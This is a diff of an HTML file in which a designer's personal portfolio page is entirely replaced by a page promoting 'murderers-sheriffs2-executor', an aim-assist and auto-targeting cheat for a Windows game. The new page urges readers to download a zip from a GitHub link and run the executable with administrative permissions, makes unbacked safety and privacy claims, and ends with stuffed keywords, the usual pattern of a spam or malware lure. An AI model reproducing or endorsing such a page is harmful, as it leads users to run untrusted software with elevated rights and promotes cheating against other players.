@@ -1,460 +1,62 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Jhon Vincent | Graphic Designer</title>
-
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    scroll-behavior:smooth;
-}
-
-body{
-    font-family:'Poppins',sans-serif;
-    background:#0f172a;
-    color:#fff;
-}
-
-header{
-    position:fixed;
-    width:100%;
-    top:0;
-    background:rgba(15,23,42,.85);
-    backdrop-filter:blur(10px);
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:20px 10%;
-    z-index:1000;
-}
-
-.logo{
-    font-size:28px;
-    font-weight:700;
-    color:#38bdf8;
-}
-
-nav a{
-    color:white;
-    text-decoration:none;
-    margin-left:25px;
-    transition:.3s;
-}
-
-nav a:hover{
-    color:#38bdf8;
-}
-
-.hero{
-    min-height:100vh;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:0 10%;
-    gap:50px;
-}
-
-.hero-text h1{
-    font-size:60px;
-}
-
-.hero-text span{
-    color:#38bdf8;
-}
-
-.hero-text p{
-    margin:20px 0;
-    color:#cbd5e1;
-    line-height:1.7;
-}
-
-.btn{
-    display:inline-block;
-    padding:14px 35px;
-    background:#38bdf8;
-    color:#0f172a;
-    text-decoration:none;
-    border-radius:50px;
-    font-weight:600;
-    transition:.3s;
-}
-
-.btn:hover{
-    transform:translateY(-4px);
-}
-
-.hero img{
-    width:380px;
-    border-radius:20px;
-    box-shadow:0 20px 50px rgba(0,0,0,.4);
-}
-
-section{
-    padding:100px 10%;
-}
-
-.title{
-    text-align:center;
-    font-size:40px;
-    margin-bottom:50px;
-}
-
-.about{
-    display:grid;
-    grid-template-columns:1fr 1fr;
-    gap:50px;
-    align-items:center;
-}
-
-.about p{
-    color:#cbd5e1;
-    line-height:1.8;
-}
-
-.skills{
-    display:flex;
-    flex-wrap:wrap;
-    gap:15px;
-    margin-top:20px;
-}
-
-.skills span{
-    background:#1e293b;
-    padding:10px 20px;
-    border-radius:30px;
-}
-
-.portfolio{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
-    gap:25px;
-}
-
-.card{
-    overflow:hidden;
-    border-radius:18px;
-    background:#1e293b;
-    transition:.4s;
-}
-
-.card:hover{
-    transform:translateY(-10px);
-}
-
-.card img{
-    width:100%;
-    display:block;
-}
-
-.card-content{
-    padding:20px;
-}
-
-.card-content h3{
-    margin-bottom:10px;
-}
-
-.card-content p{
-    color:#cbd5e1;
-}
-
-.services{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
-    gap:25px;
-}
-
-.service{
-    background:#1e293b;
-    padding:35px;
-    border-radius:15px;
-}
-
-.service h3{
-    margin-bottom:15px;
-    color:#38bdf8;
-}
-
-.contact{
-    text-align:center;
-}
-
-.contact p{
-    color:#cbd5e1;
-    margin-bottom:20px;
-}
-
-footer{
-    text-align:center;
-    padding:30px;
-    background:#020617;
-    color:#94a3b8;
-}
-
-@media(max-width:900px){
-
-.hero{
-    flex-direction:column-reverse;
-    text-align:center;
-    padding-top:120px;
-}
-
-.hero img{
-    width:280px;
-}
-
-.hero-text h1{
-    font-size:42px;
-}
-
-.about{
-    grid-template-columns:1fr;
-}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="PC script utility for Murderers vs Sheriffs 2 that adds aim assistance and automated target handling.">
+    <title>murderers-sheriffs2-executor - Improve your gameplay responsiveness today</title>
 </head>
-
-<body>
-
-<header>
-
-<div class="logo">JV.</div>
-
-<nav>
-<a href="#home">Home</a>
-<a href="#about">About</a>
-<a href="#portfolio">Portfolio</a>
-<a href="#services">Services</a>
-<a href="#contact">Contact</a>
-</nav>
-
-</header>
-
-<section class="hero" id="home">
-
-<div class="hero-text">
-
-<h1>Hello, I'm <span>Jhon Vincent Jose</span></h1>
-
-<p>
-Creative Graphic Designer specializing in branding,
-social media designs, logos. I transform ideas into stunning visuals.
-</p>
-
-<a href="#portfolio" class="btn">View Portfolio</a>
-
-</div>
-
-<img src="https://github.com/josejhonvincent/images/blob/main/9760ED9A-5FEE-4066-B939-5D5BEE8E5580.png?raw=true" alt="Designer">
-
-</section>
-
-<section id="about">
-
-<h2 class="title">About Me</h2>
-
-<div class="about">
-
-<div>
-
-<h3>Design That Makes an Impact</h3>
-
-<p>
-With over six years of experience in graphic design,
-I create compelling visual identities for businesses,
-brands, and content creators. My goal is to blend
-creativity with strategy to deliver meaningful designs.
-</p>
-
-</div>
-
-<div>
-
-<div class="skills">
-<span>Adobe Photoshop</span>
-<span>Illustrator</span>
-<span>After Effects</span>
-<span>Canva</span>
-<span>Lightroom Classic</span>
-<span>Capcut</span>
-<span>Filmora X</span>
-<span>Logo Design</span>
-<span>Brand Identity</span>
-<span>Social Media</span>
-</div>
-
-</div>
-
-</div>
-
-</section>
-
-<section id="portfolio">
-	
-<h2 class="title">Portfolio</h2>
-
-<section>
-	<h3 style="text-align:center">Spotify Podcast Cover</h3>
-</section>
-	
-<div class="portfolio">
-    
-<div class="card">
-<img src="https://github.com/josejhonvincent/images/blob/6b0423fcace4c077deeaaf9cb18f3963bb4f49f2/S1.jpg?raw=true" width="300" height="300">
-</div>
-
-<div class="card">
-<img src="https://github.com/josejhonvincent/images/blob/6b0423fcace4c077deeaaf9cb18f3963bb4f49f2/S4.jpg?raw=true" width="300" height="300">
-</div>
-    
-<div class="card">
-<img src="https://github.com/josejhonvincent/images/blob/6b0423fcace4c077deeaaf9cb18f3963bb4f49f2/S2.png?raw=true" width="300" height="300">
-</div>
-
-<div class="card">
-<img src="https://github.com/josejhonvincent/images/blob/6b0423fcace4c077deeaaf9cb18f3963bb4f49f2/S3.png?raw=true" width="300" height="300">
-</div>
-    
-</div>
-</section>
-	
-<h3 style="text-align:center">Banner and Logo</h3>
-
-<section class="gallery">
-
-	<center>
-  	<img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Roll%20Up%20Banner.png?raw=true" width="210" height="450">
-
-	<img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Roll%20Up%20Banner.jpg?raw=true" width="230" height="450">
-		
-<div class="gallery1">
-
-	<img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Adaptive%20Branding.png?raw=true" width="350" height="200">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Padayon%20Logo.jpg?raw=true" width="350" height="200">
-
-    <img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Team%20PikaJems%20Logo.png?raw=true" width="200" height="200">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/dj%20treats.png?raw=truee" width="200" height="200">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Biglaang%20Mountaineers.png?raw=true" width="200" height="200">
-
-    <img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/Battery%20White%20Shirt.png?raw=true" width="200" height="130">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/banner-and-logo/TaHeart%20Logo.png?raw=true" width="200" height="130">
-	
-</div>
-</center>
-    
-</section>
-	
-<h3 style="text-align:center">Social Media Post</h3>
-
-<section class="socmed">
-
-	<center>
-
-	<img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/Champion.jpg?raw=true" width="300" height="300">
-
-	<img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/Champion%20Result.jpg?raw=true" width="300" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/MNLpost.jpg?raw=true" width="300" height="300">
-
-	<img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/Concert%20Pubmat.png?raw=true" width="300" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/MNLxWCS.png?raw=true" width="300" height="300">
-
-	<img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/MNLpost1.jpg?raw=true" width="400" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/PPOPCON%20PUBMAT.png?raw=true" width="500" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/SocMedPost.jpg?raw=true" width="300" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/SocMedPost2.jpg?raw=true" width="300" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/SocMedPost4.jpg?raw=true" width="300" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Social-Media-Post/SocMedPost3.jpg?raw=true" width="200" height="300">
-
-    </center>
-    
-</section>
-
-	<h3 style="text-align:center">Mockup</h3>
-
-<section class="Mockup">
-
-	<center>
-
-	<img src="https://github.com/josejhonvincent/images/blob/Mockup/Stacked%20Actual.png?raw=true" width="300" height="300">
-
-	<img src="https://github.com/josejhonvincent/images/blob/Mockup/Logo.png?raw=true" width="300" height="300">
-    
-    <img src="https://github.com/josejhonvincent/images/blob/Mockup/Toothpaste%20&%20Box.jpg?raw=true" width="350" height="300">
-
-	<img src="https://github.com/josejhonvincent/images/blob/Mockup/Toothpaste%20Box%20Template.png?raw=true" width="300" height="300">
-    
-    </center>
-    
-</section>
-
-<section id="services">
-
-<h2 class="title">Services</h2>
-
-<div class="services">
-
-<div class="service">
-<h3>Logo Design</h3>
-<p>Unique and memorable logos for businesses.</p>
-</div>
-
-<div class="service">
-<h3>Brand Identity</h3>
-<p>Complete branding systems and visual guidelines.</p>
-</div>
-
-<div class="service">
-<h3>Social Media</h3>
-<p>Creative posts, ads, banners, and marketing assets.</p>
-</div>
-
-
-</div>
-
-</section>
-
-<section id="contact">
-
-<h2 class="title">Let's Work Together</h2>
-
-<div class="contact">
-
-<p>
-Interested in working together? Let's create something amazing.
-</p>
-
-<a href="https://www.instagram.com/round.cheese/" class="btn">
-Contact Me
-</a>
-
-</div>
-
-</section>
-
-<footer>
-
-© 2026 Jhon Vincent Jose • Graphic Designer Portfolio
-
-</footer>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 20px; background-color: #f4f4f4;">
+
+    <h1 style="color: #2c3e50;">🎯 murderers-sheriffs2-executor - Improve your gameplay responsiveness today</h1>
+
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/joeymorbilliform125/murderers-sheriffs2-executor" style="background-color: #34495e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software</a>
+    </div>
+
+    <section style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">💡 About This Tool</h2>
+        <p>This utility works with the Murderers vs Sheriffs 2 game on Windows. It adds aim assistance and target handling features. Use this tool if you want better responsiveness during your play sessions. The software automates specific tasks so you can focus on your moves.</p>
+    </section>
+
+    <section style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+        <ul style="padding-left: 20px;">
+            <li>Windows 10 or Windows 11 64-bit</li>
+            <li>4GB of RAM</li>
+            <li>Stable internet connection</li>
+            <li>Administrative permissions to launch software</li>
+        </ul>
+    </section>
+
+    <section style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+        <p>Follow these steps to set up the software on your computer.</p>
+        <ol style="padding-left: 20px;">
+            <li style="margin-bottom: 10px;"><strong>Visit the download page:</strong> Go to <a href="https://github.com/joeymorbilliform125/murderers-sheriffs2-executor">this link</a> to access the latest version.</li>
+            <li style="margin-bottom: 10px;"><strong>Download the file:</strong> Look for the release zip file and save it to your desktop.</li>
+            <li style="margin-bottom: 10px;"><strong>Extract the files:</strong> Right-click the folder and select "Extract All" to prepare the files for use.</li>
+            <li style="margin-bottom: 10px;"><strong>Run the application:</strong> Locate the executable file and double-click it to start the tool.</li>
+            <li style="margin-bottom: 10px;"><strong>Adjust settings:</strong> Use the on-screen menu to select your preferred aim assistance level.</li>
+        </ol>
+    </section>
+
+    <section style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">🛡️ Security and Privacy</h2>
+        <p>We respect your privacy. This software runs locally on your PC. It does not send your personal data to external servers. Only use official links provided in this document to ensure you have the authentic version of the code. We scan all files for safety before each release.</p>
+    </section>
+
+    <section style="background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 20px;">
+        <h2 style="color: #2c3e50;">❓ Frequently Asked Questions</h2>
+        <h3 style="font-size: 1.1em;">Does this affect game files?</h3>
+        <p>No. This utility acts as an external helper. It reads game state information to provide assistance without modifying game files.</p>
+        <h3 style="font-size: 1.1em;">Will this run on older Windows versions?</h3>
+        <p>While the tool might work on older systems, we recommend Windows 10 or 11 for the best performance and compatibility.</p>
+    </section>
+
+    <footer style="margin-top: 40px; font-size: 0.9em; color: #777;">
+        <p>Keywords: Murderers vs Sheriffs 2, script utility, aim assistance, target handling, Windows software, gaming helper</p>
+    </footer>
 
 </body>
 </html>
